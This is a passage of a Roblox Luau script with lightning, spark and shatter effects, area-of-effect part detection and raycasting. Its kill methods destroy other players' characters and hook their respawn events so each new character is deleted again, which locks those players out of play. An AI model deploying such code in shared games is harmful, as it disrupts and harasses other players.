			local bezier1 = CubicBezier(p0, p1, p2, p3, t1)
			local NextPoint = i ~= MainBranchN and (CFrame.lookAt(bezier0, bezier1)).Position or bezier1
			local BPart = BoltPart:Clone()
			BPart.Size = Vector3.new((NextPoint - PrevPoint).Magnitude, 0, 0)
			BPart.CFrame = CFrame.lookAt(0.5*(PrevPoint + NextPoint), NextPoint)*xInverse
			BPart.Parent = parent
			BPart.Locked, BPart.CastShadow = true, false
			self.Parts[i] = BPart
			PrevPoint, bezier0 = NextPoint, bezier1
		end

		self.PartsHidden = false
		self.DisabledTransparency = 1
		self.StartT = clock()
		self.RanNum = math.random()*100
		self.RefIndex = #ActiveBranches + 1

		ActiveBranches[self.RefIndex] = self

		return self
	end

	function LightningBolt:Destroy()
		ActiveBranches[self.RefIndex] = nil

		for i = 1, #self.Parts do
			self.Parts[i]:Destroy()

			if i%100 == 0 then wait() end
		end

		self = nil
	end

	local offsetAngle = math.cos(math.rad(90))

	game:GetService(""RunService"").Heartbeat:Connect(function()

		for _, ThisBranch in pairs(ActiveBranches) do
			if ThisBranch.Enabled == true then
				ThisBranch.PartsHidden = false
				local MinOpa, MaxOpa = 1 - ThisBranch.MaxTransparency, 1 - ThisBranch.MinTransparency
				local MinRadius, MaxRadius = ThisBranch.MinRadius, ThisBranch.MaxRadius
				local thickness = ThisBranch.Thickness
				local Parts = ThisBranch.Parts
				local PartsN = #Parts
				local RanNum = ThisBranch.RanNum
				local StartT = ThisBranch.StartT
				local spd = ThisBranch.AnimationSpeed
				local freq = ThisBranch.Frequency
				local MinThick, MaxThick = ThisBranch.MinThicknessMultiplier, ThisBranch.MaxThicknessMultiplier
				local a0, a1, CurveSize0, CurveSize1 = ThisBranch.Attachment0, ThisBranch.Attachment1, ThisBranch.CurveSize0, ThisBranch.CurveSize1
				local p0, p1, p2, p3 = a0.WorldPosition, a0.WorldPosition + a0.WorldAxis*CurveSize0, a1.WorldPosition - a1.WorldAxis*CurveSize1, a1.WorldPosition
				local timePassed = clock() - StartT
				local PulseLength, PulseSpeed, FadeLength = ThisBranch.PulseLength, ThisBranch.PulseSpeed, ThisBranch.FadeLength
				local Color = ThisBranch.Color
				local ColorOffsetSpeed = ThisBranch.ColorOffsetSpeed
				local contractf = 1 - ThisBranch.ContractFrom
				local PrevPoint, bezier0 = p0, p0

				if timePassed < (PulseLength + 1) / PulseSpeed then

					for i = 1, PartsN do
						--local spd = NoiseBetween(i/PartsN, 1.5, 0.1*i/PartsN, -MinAnimationSpeed, MaxAnimationSpeed) --Can enable to have an alternative animation which doesn't shift the noisy lightning ""Texture"" along the bolt
						local BPart = Parts[i]
						local t1 = i/PartsN
						local Opacity = DiscretePulse(t1, PulseSpeed, PulseLength, FadeLength, timePassed, MinOpa, MaxOpa)
						local bezier1 = CubicBezier(p0, p1, p2, p3, t1)
						local time = -timePassed --minus to ensure bolt waves travel from a0 to a1
						local input, input2 = (spd*time) + freq*10*t1 - 0.2 + RanNum*4, 5*((spd*0.01*time) / 10 + freq*t1) + RanNum*4
						local noise0 = NoiseBetween(5*input, 1.5, 5*0.2*input2, 0, 0.1*2*math.pi) + NoiseBetween(0.5*input, 1.5, 0.5*0.2*input2, 0, 0.9*2*math.pi)
						local noise1 = NoiseBetween(3.4, input2, input, MinRadius, MaxRadius)*math.exp(-5000*(t1 - 0.5)^10)
						local thicknessNoise = NoiseBetween(2.3, input2, input, MinThick, MaxThick)
						local NextPoint = i ~= PartsN and (CFrame.new(bezier0, bezier1)*CFrame.Angles(0, 0, noise0)*CFrame.Angles(math.acos(math.clamp(NoiseBetween(input2, input, 2.7, offsetAngle, 1), -1, 1)), 0, 0)*CFrame.new(0, 0, -noise1)).Position or bezier1

						if Opacity > contractf then
							BPart.Size = Vector3.new((NextPoint - PrevPoint).Magnitude, thickness*thicknessNoise*Opacity, thickness*thicknessNoise*Opacity)
							BPart.CFrame = CFrame.lookAt(0.5*(PrevPoint + NextPoint), NextPoint)*xInverse
							BPart.Transparency = 1 - Opacity
						elseif Opacity > contractf - 1/(PartsN*FadeLength) then
							local interp = (1 - (Opacity - (contractf - 1/(PartsN*FadeLength)))*PartsN*FadeLength)*(t1 < timePassed*PulseSpeed - 0.5*PulseLength and 1 or -1)
							BPart.Size = Vector3.new((1 - math.abs(interp))*(NextPoint - PrevPoint).Magnitude, thickness*thicknessNoise*Opacity, thickness*thicknessNoise*Opacity)
							BPart.CFrame = CFrame.lookAt(PrevPoint + (NextPoint - PrevPoint)*(math.max(0, interp) + 0.5*(1 - math.abs(interp))), NextPoint)*xInverse
							BPart.Transparency = 1 - Opacity
						else
							BPart.Transparency = 1
						end

						if typeof(Color) == ""Color3"" then
							BPart.Color = Color
						else --ColorSequence
							t1 = (RanNum + t1 - timePassed*ColorOffsetSpeed)%1
							local keypoints = Color.Keypoints 
							for i = 1, #keypoints - 1 do --convert colorsequence onto lightning
								if keypoints[i].Time < t1 and t1 < keypoints[i+1].Time then
									BPart.Color = keypoints[i].Value:lerp(keypoints[i+1].Value, (t1 - keypoints[i].Time)/(keypoints[i+1].Time - keypoints[i].Time))
									break
								end
							end
						end

						PrevPoint, bezier0 = NextPoint, bezier1
					end

				else

					ThisBranch:Destroy()

				end

			else --Enabled = false

				if ThisBranch.PartsHidden == false then
					ThisBranch.PartsHidden = true
					local datr = ThisBranch.DisabledTransparency
					for i = 1, #ThisBranch.Parts do
						ThisBranch.Parts[i].Transparency = datr
					end
				end

			end
		end

	end)

	return LightningBolt
end)()

local LightningModuleSparks = (function()
	--Adds sparks effect to a Lightning Bolt
	local LightningBolt = LightningModule

	local ActiveSparks = {}


	local rng = Random.new()
	local LightningSparks = {}
	LightningSparks.__index = LightningSparks

	function LightningSparks.new(LightningBolt, MaxSparkCount)
		local self = setmetatable({}, LightningSparks)

		--Main (default) properties--

		self.Enabled = true --Stops spawning sparks when false
		self.LightningBolt = LightningBolt --Bolt which sparks fly out of
		self.MaxSparkCount = MaxSparkCount or 10 --Max number of sparks visible at any given instance
		self.MinSpeed, self.MaxSpeed = 3, 6 --Min and max PulseSpeeds of sparks
		self.MinDistance, self.MaxDistance = 3, 6 --Governs how far sparks travel away from main bolt
		self.MinPartsPerSpark, self.MaxPartsPerSpark = 8, 10 --Adjustable

		--

		self.SparksN = 0
		self.SlotTable = {}
		self.RefIndex = #ActiveSparks + 1

		ActiveSparks[self.RefIndex] = self

		return self
	end

	function LightningSparks:Destroy()
		ActiveSparks[self.RefIndex] = nil

		for i, v in pairs(self.SlotTable) do
			if v.Parts[1].Parent == nil then
				self.SlotTable[i] = nil --Removes reference to prevent memory leak
			end
		end

		self = nil
	end

	local function RandomVectorOffset(v, maxAngle) --returns uniformly-distributed random unit vector no more than maxAngle radians away from v
		return (CFrame.lookAt(Vector3.new(), v)*CFrame.Angles(0, 0, rng:NextNumber(0, 2*math.pi))*CFrame.Angles(math.acos(rng:NextNumber(math.cos(maxAngle), 1)), 0, 0)).LookVector
	end 

	game:GetService(""RunService"").Heartbeat:Connect(function ()

		for _, ThisSpark in pairs(ActiveSparks) do

			if ThisSpark.Enabled == true and ThisSpark.SparksN < ThisSpark.MaxSparkCount then

				local Bolt = ThisSpark.LightningBolt

				if Bolt.Parts[1].Parent == nil then
					ThisSpark:Destroy()
					return 
				end

				local BoltParts = Bolt.Parts
				local BoltPartsN = #BoltParts

				local opaque_parts = {}

				for part_i = 1, #BoltParts do --Fill opaque_parts table

					if BoltParts[part_i].Transparency < 0.3 then --minimum opacity required to be able to generate a spark there
						opaque_parts[#opaque_parts + 1] = (part_i - 0.5) / BoltPartsN
					end

				end

				local minSlot, maxSlot 

				if #opaque_parts ~= 0 then
					minSlot, maxSlot = math.ceil(opaque_parts[1]*ThisSpark.MaxSparkCount), math.ceil(opaque_parts[#opaque_parts]*ThisSpark.MaxSparkCount)
				end

				for _ = 1, rng:NextInteger(1, ThisSpark.MaxSparkCount - ThisSpark.SparksN) do

					if #opaque_parts == 0 then break end

					local available_slots = {}

					for slot_i = minSlot, maxSlot do --Fill available_slots table

						if ThisSpark.SlotTable[slot_i] == nil then --check slot doesn't have existing spark
							available_slots[#available_slots + 1] = slot_i
						end

					end

					if #available_slots ~= 0 then 

						local ChosenSlot = available_slots[rng:NextInteger(1, #available_slots)]
						local localTrng = rng:NextNumber(-0.5, 0.5)
						local ChosenT = (ChosenSlot - 0.5 + localTrng)/ThisSpark.MaxSparkCount

						local dist, ChosenPart = 10, 1

						for opaque_i = 1, #opaque_parts do
							local testdist = math.abs(opaque_parts[opaque_i] - ChosenT)
							if testdist < dist then
								dist, ChosenPart = testdist, math.floor((opaque_parts[opaque_i]*BoltPartsN + 0.5) + 0.5)
							end
						end

						local Part = BoltParts[ChosenPart]

						--Make new spark--

						local A1, A2 = {}, {}
						A1.WorldPosition = Part.Position + localTrng*Part.CFrame.RightVector*Part.Size.X
						A2.WorldPosition = A1.WorldPosition + RandomVectorOffset(Part.CFrame.RightVector, math.pi/4)*rng:NextNumber(ThisSpark.MinDistance, ThisSpark.MaxDistance)
						A1.WorldAxis = (A2.WorldPosition - A1.WorldPosition).Unit
						A2.WorldAxis = A1.WorldAxis
						local NewSpark = LightningBolt.new(A1, A2, rng:NextInteger(ThisSpark.MinPartsPerSpark, ThisSpark.MaxPartsPerSpark))

						--NewSpark.MaxAngleOffset = math.rad(70)
						NewSpark.MinRadius, NewSpark.MaxRadius = 0, 0.8
						NewSpark.AnimationSpeed = .4
						NewSpark.Thickness = Part.Size.Y / 2
						NewSpark.MinThicknessMultiplier, NewSpark.MaxThicknessMultiplier = 1, 1
						NewSpark.PulseLength = 0.5
						NewSpark.PulseSpeed = rng:NextNumber(ThisSpark.MinSpeed, ThisSpark.MaxSpeed)
						NewSpark.FadeLength = 0.25
						local cH, cS, cV = Color3.toHSV(Part.Color)
						NewSpark.Color = Color3.fromHSV(cH, 0.6, cV)

						ThisSpark.SlotTable[ChosenSlot] = NewSpark

						--

					end

				end

			end



			--Update SparksN--

			local slotsInUse = 0

			for i, v in pairs(ThisSpark.SlotTable) do
				if v.Parts[1].Parent ~= nil then
					slotsInUse = slotsInUse + 1
				else
					ThisSpark.SlotTable[i] = nil --Removes reference to prevent memory leak
				end
			end

			ThisSpark.SparksN = slotsInUse

			--
		end

	end)

	return LightningSparks
end)()

function sc:Lightning(Part0, Part1, Times, Offset, Color, Thickness)
	local Tabl = {}
	local magz = (Part0 - Part1).magnitude
	local curpos = Part0
	local lightningparts = {}
	local trz = {
		-Offset,
		Offset
	}
	if(Times <= 1)then
		Times = math.clamp(math.floor(magz/(5+(Thickness*2))),1,100)
	end
	if Times > 5 then
		local sp = Instance.new('Part',self.EffectModel)
		sp.Position = Part0
		sp.Anchored = true
		sp.Transparency = 1
		sp.CanCollide = false
		local sn = Instance.new('Sound',sp)
		sn.SoundId = ""rbxassetid://""..821439273
		sn.Volume = Times/6
		sn.Pitch = math.random(50,150)/100
		sn.PlayOnRemove = true
		sn:Destroy()
		game:GetService('Debris'):AddItem(sp, 0.01)
	end
	if Times >= 20 then
		local sp = Instance.new('Part',self.EffectModel)
		sp.Position = Part1
		sp.Anchored = true
		sp.Transparency = 1
		sp.CanCollide = false
		local sn = Instance.new('Sound',sp)
		sn.SoundId = ""rbxassetid://""..821439273
		sn.Volume = Times/6
		sn.Pitch = math.random(50,150)/100
		sn.PlayOnRemove = true
		sn:Destroy()
		game:GetService('Debris'):AddItem(sp, 0.01)
	end
	local ranCF = CFrame.fromAxisAngle((Part1 - Part0).Unit, (math.random(-100,100)/100)*math.pi)
	local A1, A2 = {}, {}

	A1.WorldPosition, A1.WorldAxis = Part0, ranCF*Vector3.new(1,1,1)
	A2.WorldPosition, A2.WorldAxis = Part1, ranCF*Vector3.new(1,1,1)

	local NewBolt = LightningModule.new(A1, A2, Times)
	NewBolt.CurveSize0 = Offset/2 * (Times/4)
	NewBolt.PulseSpeed = 5/math.clamp(Times/5, 1, 5)
	NewBolt.PulseLength = 1
	NewBolt.FadeLength = 0.25
	NewBolt.Thickness = Thickness
	NewBolt.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color),
		ColorSequenceKeypoint.new(1, Color3.new(Color.R/2,Color.G/2,Color.B/2))
	})

	local NewSparks = LightningModuleSparks.new(NewBolt, 3)
	NewSparks.MinPartsPerSpark = 3
	NewSparks.MaxPartsPerSpark = math.clamp(5+math.ceil(Times), 5, 30)
	NewSparks.MinDistance = 1
	NewSparks.MaxDistance = math.clamp(Times/3, 1, 10)
end

function getNumberOfPartsInModel(model)
	local a = 0
	for i,v in next, model:GetDescendants() do
		if(v:IsA(""BasePart""))then
			a += 1
		end
	end
	return a
end

function IsPointInVolume(point: Vector3, volumeCenter: CFrame, volumeSize: Vector3): boolean
	local volumeSpacePoint = volumeCenter:PointToObjectSpace(point)
	return volumeSpacePoint.X >= -volumeSize.X/2
		and volumeSpacePoint.X <= volumeSize.X/2
		and volumeSpacePoint.Y >= -volumeSize.Y/2
		and volumeSpacePoint.Y <= volumeSize.Y/2
		and volumeSpacePoint.Z >= -volumeSize.Z/2
		and volumeSpacePoint.Z <= volumeSize.Z/2
end

function GetClosestPoint(part : BasePart, vector : Vector3) : Vector3
	local closestPoint = part.CFrame:PointToObjectSpace(vector)
	local size = part.Size / 2
	closestPoint = Vector3.new(
		math.clamp(closestPoint.x, -size.x, size.x),
		math.clamp(closestPoint.y, -size.y, size.y),
		math.clamp(closestPoint.z, -size.z, size.z)
	)
	return part.CFrame:PointToWorldSpace(closestPoint)
end

function sc.isDescendantOfIgnores(obj)
	for i,v in next, sc.Ignore do
		if(obj:IsDescendantOf(v) or obj == v)then
			return true
		end
	end
	return false
end

function Aoe(Position, Range)
	local Descendants = workspace:GetDescendants()
	local parts = {}
	for i = 1, #Descendants do
		local Object = Descendants[i]
		if Object ~= workspace and not Object:IsA(""Terrain"") and Object:IsA(""BasePart"") then
			local ClosestPoint = GetClosestPoint(Object, (typeof(Position) == ""CFrame"" and Position.Position or Position))
			local Magnitude = (Object.Position - (typeof(Position) == ""CFrame"" and Position.Position or Position)).Magnitude
			if IsPointInVolume(ClosestPoint, (typeof(Position) == ""Vector3"" and CFrame.new(Position.X,Position.Y,Position.Z) or Position), (typeof(Range) ~= ""Vector3"" and Vector3.new(Range,Range,Range) or Range)) then
				table.insert(parts, Object)
			end
		end
	end
	return parts
end

local LastShatter = tick()
local ShatterDebounceTime = 0.5
local Decimated = {}

function AddToDecimateTable(Object)
	local ShouldCheck = {
		""Size"",
		""Color"",
		""Shape"",
		""Name"",
		""Position"",
		""MeshId"",
		""MeshID"",
		""TextureId"",
		""TextureID"",
		""ClassName""
	}
	local tbl = {}
	for i, v in next, ShouldCheck do
		local succ, returned = pcall(function()
			return Object[v]
		end)
		if(succ)then
			tbl[v] = returned
		end
	end	
	tbl[""NumOfDescendants""] = #Object:GetDescendants()
	if(Object:FindFirstChildOfClass(""SpecialMesh""))then
		tbl[""SpecialMeshId""] = Object:FindFirstChildOfClass(""SpecialMesh"").MeshId
		tbl[""SpecialMeshType""] = Object:FindFirstChildOfClass(""SpecialMesh"").MeshType
	end
	tbl.self = Object
	table.insert(Decimated, tbl)
end

function DoDecimateCheck(Object)
	local matches = 0
	local alreadyChecked = {}
	pcall(function()
		sc.UpdateIgnore()
	end)
	if(sc.isDescendantOfIgnores(Object))then
		return false, 0
	end
	for i, v in next, Decimated do
		for index, value in next, v do
			if(not table.find(alreadyChecked, index))then
				pcall(function()
					local succ, matched = pcall(function()
						if(Object[index] == value)then
							return true
						end
					end)
					if(succ)and(matched)then
						matches += 1
					end
					pcall(function()
						if(index == ""Size"")and(not matched)then
							if(Object[index] - value) <= .3 then
								matches += 1
								matched = true
							end
						end
					end)
					pcall(function()
						if(index == ""Position"")and(not matched)then
							if(Object[index] - value).Magnitude <= 5 then
								Decimated[i][index] = Object[index]
								matches += 1
								matched = true
							end
						end
					end)
					if(index == ""NumOfDescendants"")then
						if(value == #Object:GetDescendants())then
							matches += 1
							matched = true
						end
					end
					pcall(function()
						if(tostring(index):find(""SpecialMesh""))then
							if(Object:FindFirstChildOfClass(""SpecialMesh""))then
								if(Object:FindFirstChildOfClass(""SpecialMesh"")[string.gsub(tostring(index), ""Special"", '')] == value)then
									matches += 1
									matched = true
								end
							end
						end
					end)
					if(matched)then
						table.insert(alreadyChecked, index)
					end
				end)
			end
		end
	end
	return matches >= 5, matches
end

sc.DecimateMethods = {
	[1] = {
		Name = ""Destroy"",
		Function = function(v)
			pcall(game.Destroy, v)
		end,
	},
	[2] = {
		Name = ""CFrame Kill"",
		Function = function(v)
			local function Kill(b)
				b.CFrame = CFrame.new(99e9,99e9,99e9)
				local changed
				changed = b.Changed:Connect(function()
					if(not v:IsDescendantOf(game))then
						changed:Disconnect()
						return
					end
					b.CFrame = CFrame.new(99e9,99e9,99e9)
				end)
			end
			if(v:IsA(""Model""))then
				for i,b in next, v:GetDescendants() do
					if(b:IsA(""BasePart""))then
						Kill(b)
					end
				end
			else
				Kill(v)
				for i,b in next, v:GetDescendants() do
					if(b:IsA(""BasePart""))then
						Kill(b)
					end
				end
			end
		end,
	}
}

function sc.DecimateCheck(object)
	local self = sc
	pcall(function()
		self.UpdateIgnore()
	end)
	if(self.isDescendantOfIgnores(object))then
		return
	end
	local function check(v)
		local matched, matches = DoDecimateCheck(v)
		if(v:IsA(""Model""))then
			if(matches >= 2)then
				self.DecimateMethods[self.DecimateMethod].Function(v)
			end
		else
			if(matched)then
				self.DecimateMethods[self.DecimateMethod].Function(v)
			end
		end
	end
	pcall(check, object)
	task.defer(check, object)
end

sc.KillMethods = {
	[1] = {
		Name = ""Shatter"",
		Function = function(v, m)
			local maxparts = 50
			if(m)then
				if(m:IsDescendantOf(game) and m)then
					if(getNumberOfPartsInModel(m) <= maxparts)then
						if((tick() - LastShatter)>=ShatterDebounceTime)then
							sc:Shatter(m)
							LastShatter = tick()
						end
						pcall(game.Destroy, m)
					else
						pcall(game.Destroy, m)
					end
				end
			else
				if(v:IsDescendantOf(game) and v)then
					if(getNumberOfPartsInModel(v) <= maxparts)then
						if((tick() - LastShatter)>=ShatterDebounceTime)then
							sc:Shatter(v)
							LastShatter = tick()
						end
						pcall(game.Destroy, v)
					else
						pcall(game.Destroy, v)
					end
				end
			end
		end,
	},
	[2] = {
		Name = ""Destroy"",
		Function = function(v, m)
			pcall(game.Destroy, m or v)
		end,
	},
	[3] = {
		Name = ""CFrame Kill"",
		Function = function(v, m)
			local function Kill(b)
				b.CFrame = CFrame.new(99e9,99e9,99e9)
				local changed
				changed = b.Changed:Connect(function()
					if(not v:IsDescendantOf(game))then
						changed:Disconnect()
						return
					end
					b.CFrame = CFrame.new(99e9,99e9,99e9)
				end)
			end
			if(m)then
				for i,b in next, m:GetDescendants() do
					if(b:IsA(""BasePart""))then
						Kill(b)
					end
				end
			else
				Kill(v)
				for i,b in next, v:GetDescendants() do
					if(b:IsA(""BasePart""))then
						Kill(b)
					end
				end
			end
		end,
	},
	[4] = {
		Name = ""Character Eliminate"",
		Function = function(v, m)
			if(m)then
				if(m:IsDescendantOf(game))then
					if(m:IsA(""Model"") and game:GetService(""Players""):GetPlayerFromCharacter(m))then
						table.insert(sc.DecimateConnections, game:GetService(""Players""):GetPlayerFromCharacter(m).CharacterAdded:Connect(game.Destroy))
					end
					pcall(game.Destroy, m)
				end
			end
		end,
	},
	[5] = {
		Name = ""Exterminate."",
		Function = function(v, m)
			if(m)then
				if(m:IsDescendantOf(game))then
					if(m:IsA(""Model"") and game:GetService(""Players""):GetPlayerFromCharacter(m))then
						table.insert(sc.DecimateConnections, game:GetService(""Players""):GetPlayerFromCharacter(m).CharacterAdded:Connect(function(c)
							pcall(sc.DecimateMethods[sc.DecimateMethod].Function, c)
							task.defer(pcall, sc.DecimateMethods[sc.DecimateMethod].Function, c)
						end))
					end
					AddToDecimateTable(m)
					sc.DecimateMethods[sc.DecimateMethod].Function(m)
					for i,v in next, workspace:GetDescendants() do
						sc.UpdateIgnore()
						if(not sc.isDescendantOfIgnores(v))then
							pcall(function()
								sc.DecimateCheck(v)
							end)
						end
					end
				end
			else
				if(v:IsDescendantOf(game))then
					AddToDecimateTable(v)
					sc.DecimateMethods[sc.DecimateMethod].Function(v)
					for i,v in next, workspace:GetDescendants() do
						sc.UpdateIgnore()
						if(not sc.isDescendantOfIgnores(v))then
							pcall(function()
								sc.DecimateCheck(v)
							end)
						end
					end
				end
			end
		end
	}
}

sc.RefitMethods = {
	""Normal"",
	""LagIsTheBestDefense""
}

function sc:Aoe(Position, Range)
	local success, parts = pcall(function()
		if(self.ClientAoe)then
			return self.RemoteFunction:InvokeClient(self:GetCurrentPlayer(), ""Aoe"", {
				Position,
				Range
			})
		else
			return Aoe(Position, Range)
		end
	end)
	if(not success)then
		parts = {}
	end
	task.spawn(function()
		for i,v in next, parts do
			pcall(function()
				self.UpdateIgnore()
				if(not self.isDescendantOfIgnores(v))then
					if(v.Name:lower() ~= ""baseplate"" and v.Name:lower() ~= ""base"")then
						local m = v:FindFirstAncestorOfClass(""Model"") or v:FindFirstAncestorOfClass(""Folder"") or v:FindFirstAncestorOfClass(""WorldModel"")
						if(m)then
							if(m:IsDescendantOf(game))then
								chatfunc(sc.KillTexts[math.random(1,#sc.KillTexts)]..m.Name)
							end
						else
							if(v:IsDescendantOf(game))then
								chatfunc(sc.KillTexts[math.random(1,#sc.KillTexts)]..v.Name)
							end
						end
						if(self.KillMethods[self.KillMethod])then
							self.KillMethods[self.KillMethod].Function(v, m)
						end
					end
				end
			end)
		end
	end)
	return parts
end

function sc:CleanObject(obj,keep)
	local function clean(v)
		if v:IsA(""DataModelMesh"") and not table.find(keep,""SpecialMesh"") then
			v:Destroy()
		elseif v:IsA(""MeshPart"") and not table.find(keep,""MeshPart"") then
			local a = Instance.new(""Part"", v.Parent)
			a.Name = v.Name
			a.Size = v.Size
			a.CFrame = v.CFrame
			a.Material = v.Material
			a.Color = v.Color
			a.Transparency = v.Transparency
			a.Anchored = v.Anchored
			a.CanCollide = v.CanCollide
			a.CanQuery = v.CanQuery
			a.Parent = v.Parent
			pcall(game.Destroy,v)
		elseif v:IsA(""UnionOperation"") and not table.find(keep,""UnionOperation"")then
			local a = Instance.new(""Part"", v.Parent)
			a.Name = v.Name
			a.Size = v.Size
			a.CFrame = v.CFrame
			a.Material = v.Material
			a.Color = v.Color
			a.Transparency = v.Transparency
			a.Anchored = v.Anchored
			a.CanCollide = v.CanCollide
			a.CanQuery = v.CanQuery
			a.Parent = v.Parent
			pcall(game.Destroy,v)
		elseif v:IsA(""Sound"") and not table.find(keep,""Sound"") then
			v.PlayOnRemove = false
			v:Destroy()
		elseif v:IsA(""Decal"") and not table.find(keep,""Decal"") then
			v:Destroy()
		elseif v:IsA(""JointInstance"") and not table.find(keep,""JointInstance"") then
			v:Destroy()
		elseif v:IsA(""Script"") and not table.find(keep,""Script"") then
			v.Disabled = true
			v:Destroy()
		elseif v:IsA(""LocalScript"") and not table.find(keep,""LocalScript"") then
			v.Disabled = true
			v:Destroy()
		elseif v:IsA(""ModuleScript"") and not table.find(keep,""ModuleScript"") then
			v:Destroy()
		elseif v:IsA(""Attachment"") and not table.find(keep,""Attachment"") then
			v:Destroy()
		elseif v:IsA(""ParticleEmitter"") and not table.find(keep,""ParticleEmitter"") then
			v:Destroy()
		elseif v:IsA(""PointLight"") and not table.find(keep,""PointLight"") then
			v:Destroy()
		elseif(v:IsA(""GuiObject"") and not table.find(keep, ""GuiObject""))then
			v:Destroy()
		end
	end
	clean(obj)
	for i,v in next, obj:GetDescendants() do
		clean(v)
	end
end

function sc:Shatter(p) --thx WomanMalder UwU
	local function isdestroyed(inst)
		if (inst.Parent ~= nil) then return (false) end
		local _, b = pcall(function()
			inst.Parent = inst
		end)
		if(b:match('locked'))then
			return (true)
		else
			return (false)
		end
	end;

	local function Subtract(Part:BasePart,Negation:{Instance}|Instance,CollisionFidelity:Enum.CollisionFidelity|nil)
		if(CollisionFidelity==nil)then CollisionFidelity = 'Hull' end
		if(typeof(Negation)=='table')then
			for o, p in next, Negation do
				if (p:IsDescendantOf(workspace)) then
				else
					return
				end
			end
			return(Part:SubtractAsync(Negation, CollisionFidelity));
		else
			if(Part:IsDescendantOf(workspace))then
				return(Part:SubtractAsync({Negation}, CollisionFidelity));
			end
		end
	end;

	local function Fragment(Part, Count)
		local Fragments = {};
		local partSize = Part.Size;
		local partCF = Part.CFrame;

		if(Part:IsDescendantOf(workspace) and Count >= 0)then
			local c1 = Instance.new('Part')
			c1.Size = partSize*4
			c1.CFrame = partCF * CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))) * CFrame.new(0, -partSize.Y * 2, 0)
			local c2 = c1:Clone()
			c2.CFrame = partCF * CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))) * CFrame.new(0, partSize.Y * 2, 0)
			local p1, p2
			pcall(function()
				p1 = Subtract(Part, c1)
				p2 = Subtract(Part, c2)
			end)
			if(p1 and p2) then
				p1.CFrame = partCF * partCF:ToObjectSpace(p1.CFrame)
				p2.CFrame = partCF * partCF:ToObjectSpace(p2.CFrame)
				p1.Parent = Part.Parent
				p2.Parent = Part.Parent
				local f1 = Fragment(p1, Count-1)
				local f2 = Fragment(p2, Count-1)
				table.insert(Fragments, p1)
				table.insert(Fragments, p2)
				for i, v in next, f1 do
					table.insert(Fragments, v)
				end
				for i, v in next, f2 do
					table.insert(Fragments, v)
				end
			end
		end
		for i, v in next, Fragments do
			v.Parent = nil
		end
		if(#Fragments == 0) then
			Fragments = {Part:Clone()}
		end
		return (Fragments)
	end

	local function getbiggestaxis(vector)
		local biggest = 0
		if(vector.X>biggest)then
			biggest = vector.X
		end
		if(vector.Y>biggest)then
			biggest = vector.Y
		end
		if(vector.Z>biggest)then
			biggest = vector.Z
		end
		return biggest
	end

	local function shatterify(b)
		if(b:IsA(""BasePart""))then
			pcall(function()
				if(b.Transparency >= 1)then
					pcall(game.Destroy,b)
					return
				end
				b.Anchored = true
				local fragments = Fragment(b, -1)
				pcall(game.Destroy,b)
				for i,v in next, fragments do
					pcall(function()
						task.spawn(function()
							v.Anchored = true
							v.Parent = sc.EffectModel
							v.Material = Enum.Material.Glass
							local biggest = 1+(getbiggestaxis(v.Size)/2)
							local pos = v.Position + (Vector3.new(math.random(-3,3),math.random(2,5),math.random(-3,3))*Vector3.new(biggest,biggest,biggest))
							local mag = (v.Position - pos).Magnitude
							self:ClientTween(v,TweenInfo.new((mag/2)/biggest, Enum.EasingStyle.Back),{
								Position = pos,
								Size = v.Size/3,
								Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
							})
							task.wait((mag/2)/biggest)
							if(v and v:IsDescendantOf(game))then
								local fragments2 = Fragment(v, 0)
								if(v and v:IsDescendantOf(game))then
									pcall(game.Destroy,v)
									for i,a in next, fragments2 do
										task.spawn(function()
											a.Anchored = true
											a.Parent = sc.EffectModel
											a.Material = Enum.Material.Glass
											self:SoundEffect(a,7140152893,1,math.random(70,120)/100,true)
											biggest = 1+(getbiggestaxis(a.Size)/2)
											local pos = a.Position + (Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))*Vector3.new(biggest,biggest,biggest))
											local mag = (a.Position - pos).Magnitude
											self:ClientTween(a,TweenInfo.new(mag/biggest),{
												Position = pos,
												Size = Vector3.new(),
												Transparency = 1,
												Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
											})
											task.wait((mag)/biggest)
											pcall(game.Destroy,a)
										end)
									end
								end
							else
								pcall(game.Destroy,v)
							end
						end)
					end)
				end
				pcall(game.Destroy,b)
			end)
		end
	end
	if(p:IsA(""Model"") or p:IsA(""Folder"") or p:IsA(""WorldModel""))then
		self:SoundEffect(p:FindFirstChildWhichIsA(""Part"",true),9125402735,10,math.random(70,120)/100,true)
		self:CleanObject(p,{})
		for i,b in next, p:GetDescendants() do
			if(b:IsA(""BasePart""))then
				coroutine.wrap(shatterify)(b)
			end
		end
		pcall(game.Destroy,p)
	elseif(p:IsA(""BasePart""))then
		self:SoundEffect(p,9125402735,10,math.random(70,120)/100,true)
		self:CleanObject(p,{})
		coroutine.wrap(shatterify)(p)
		for i,v in next, p:GetDescendants() do
			if(v:IsA(""BasePart""))then
				coroutine.wrap(shatterify)(v)
			end
		end
		pcall(game.Destroy,p)
	end
end

function sc:Raycast(Start,End,Distance,Ignore)
	local Hit,Pos,Mag,Table = nil,nil,0,{}
	local B,V = workspace:FindPartOnRayWithIgnoreList(Ray.new(Start,((CFrame.new(Start,End).lookVector).unit) * Distance),(Ignore or {}))
	if B ~= nil then
		local BO = (Start - V).Magnitude
		table.insert(Table, {Hit = B, Pos = V, Mag = BO})
	end
	for i,g in next, self.WorldModels do
		local N,M = g:FindPartOnRayWithIgnoreList(Ray.new(Start,((CFrame.new(Start,End).lookVector).unit) * Distance),(Ignore or {}))
		if N ~= nil then
			local BO = (Start - M).Magnitude
			table.insert(Table, {Hit = N, Pos = M, Mag = BO})
		end
	end
	for i,g in next, Table do
		if i == 1 then
			Mag = Table[i].Mag
		end
		if Table[i].Mag <= Mag then
			Mag = Table[i].Mag
			Hit = Table[i].Hit
			Pos = Table[i].Pos
		end
	end
	return Hit,Pos
end

function sc:ClientRaycast(Start,End,Distance,Ignore)
	local success, hit, pos = pcall(function()
		return self.RemoteFunction:InvokeClient(self:GetCurrentPlayer(), ""Raycast"", {
			Start,
			End,
			Distance,
			Ignore,
			self.WorldModels
		})
	end)
	if(success)then
		return hit, pos
	else
		return nil, Vector3.new()
	end
end

function sc:ClientTween(Object,Info,Goal)
